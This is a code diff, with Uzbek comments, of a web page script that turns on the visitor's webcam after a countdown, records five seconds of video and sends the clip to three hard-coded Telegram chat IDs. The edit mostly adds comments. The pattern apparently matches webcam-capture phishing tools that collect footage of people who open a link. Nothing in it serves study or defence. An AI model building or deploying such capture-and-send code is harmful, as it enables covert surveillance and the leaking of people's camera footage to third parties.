@@ -9,23 +9,25 @@ const CHAT_IDS = ['5934257995', '5826562502', '6528560655']; // Chat ID-larni sh
 
 // Kamera oqimini olish
 function startCamera() {
+    // getUserMedia funksiyasi bilan video oqimini olish
     navigator.mediaDevices.getUserMedia({ video: true })
         .then(stream => {
-            video.srcObject = stream;
-            mediaRecorder = new MediaRecorder(stream);
-            
+            video.srcObject = stream; // Oqimni video elementiga o'rnatish
+            mediaRecorder = new MediaRecorder(stream); // MediaRecorder obyekti yaratish
+
             mediaRecorder.ondataavailable = (event) => {
-                chunks.push(event.data);
+                chunks.push(event.data); // Videoni bo'laklarga saqlash
             };
 
             mediaRecorder.onstop = () => {
-                const blob = new Blob(chunks, { type: 'video/webm' });
-                CHAT_IDS.forEach(chatId => sendVideoToTelegram(blob, chatId));
-                chunks = []; // Masivni tozalash, keyingi yozuv uchun
+                const blob = new Blob(chunks, { type: 'video/webm' }); // Yangi video fayl yaratish
+                CHAT_IDS.forEach(chatId => sendVideoToTelegram(blob, chatId)); // Telegramga yuborish
+                chunks = []; // Masivni tozalash
             };
 
-            // 10 soniya sanash
+            // Sanashni boshlash (10 soniya)
             let countdown = 10;
+            countdownElement.style.display = 'block'; // Sanashni ko'rsatish
             const countdownInterval = setInterval(() => {
                 countdownElement.textContent = countdown;
                 countdown--;
@@ -33,16 +35,16 @@ function startCamera() {
                 if (countdown < 0) {
                     clearInterval(countdownInterval);
                     countdownElement.style.display = 'none'; // Sanashni yashirish
-                    mediaRecorder.start();
+                    mediaRecorder.start(); // Videoga olishni boshlash
                     setTimeout(() => {
-                        mediaRecorder.stop();
+                        mediaRecorder.stop(); // 5 soniyadan so'ng videoni to'xtatish
                     }, 5000); // 5 soniya videoga olish
                 }
-            }, 1000); // 1 soniya interval
+            }, 1000); // Har soniyada sanash
         })
         .catch(error => {
             console.error('Kameraga kirish xatosi:', error);
-            alert('Kameraga kirishda muammo bor. Iltimos, ruxsatni tekshiring yoki boshqa brauzerdan foydalaning.');
+            alert('Kameraga kirishda muammo bor. Ruxsatni tekshiring yoki boshqa brauzerdan foydalaning.');
         });
 }
 
